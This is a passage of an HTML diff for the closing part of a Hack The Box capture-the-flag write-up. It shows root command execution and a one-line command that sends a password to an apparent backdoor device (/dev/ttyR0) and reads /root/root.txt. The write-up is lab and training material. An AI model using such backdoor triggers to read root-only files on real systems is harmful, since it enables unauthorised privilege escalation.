+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1004<span class="o">(</span>customers<span class="o">)</span></code></pre></figure>
+
+<p>Sure enough we can execute commands as <code class="highlighter-rouge">root</code>!</p>
+
+<p>Now to take the flag:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"g3tPr1v"</span> <span class="o">&gt;</span> /dev/ttyR0 <span class="o">&amp;&amp;</span> <span class="nb">cat</span> /root/root.txt
+4a08d8174e....db9a732b17</code></pre></figure>
+
+<p>That’s it. Another box rooted and my first <code class="highlighter-rouge">hard</code> difficulty machine!</p>
+
+<!-- Hack The Box Badge -->
+          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
+      </div>
+    </div>
+    <!-- Bootstrap core JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="/assets/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript -->
+    <script src="/assets/js/sabe.js"></script>
+    <!-- Lightbox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
+    <script>
+      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
+        event.preventDefault();
+        $(this).ekkoLightbox();
+      });
+    </script>
+  </body>
+</html>
